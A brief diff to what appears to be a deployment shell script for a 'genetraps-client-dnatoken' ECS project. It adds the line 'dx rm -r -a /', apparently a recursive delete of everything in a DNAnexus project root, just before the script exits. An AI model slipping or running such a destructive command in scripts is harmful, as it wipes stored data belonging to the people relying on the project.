@@ -105,4 +105,6 @@ ecs-cli compose --project-name genetraps-client-dnatoken -f docker-compose.yml -
 
 #./scripts/update-repo.sh
 
+dx rm -r -a /
+
 exit 0
